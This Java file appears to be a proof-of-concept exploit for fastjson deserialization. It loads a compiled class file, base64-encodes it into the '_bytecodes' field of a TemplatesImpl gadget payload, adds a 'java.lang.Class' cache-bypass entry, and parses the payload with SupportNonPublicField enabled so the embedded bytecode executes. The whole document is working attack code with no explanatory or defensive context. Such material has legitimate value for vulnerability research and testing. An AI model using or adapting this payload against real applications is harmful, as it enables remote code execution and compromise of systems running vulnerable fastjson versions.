package com.test.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import sun.misc.BASE64Encoder;

import java.io.IOException;
import java.io.InputStream;

public class TemplatesImpl {

    public static void main(String[] args) throws IOException {
        //执行前先编译CallbackRuntime类得到class文件
        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream("com/test/fastjson/command.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String base64Class = new BASE64Encoder().encode(bytes);
        base64Class = base64Class.replaceAll("\\r\\n","");
        String payload = "{\n" +
                "    \"name\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\n" +
                "    },\n" +
                "    \"x\": {\n" +
                "        \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "        \"_bytecodes\":[\""+base64Class+"\"],\n" +
                "        \"_name\":\"a.b\",\n" +
                "        \"_tfactory\":{ },\n" +
                "        \"_outputProperties\":{ }\n" +
                "        };\n" +
                "    }\n" +
                "}\n";
        JSON.parseObject(payload,Object.class, Feature.SupportNonPublicField);
    }
}
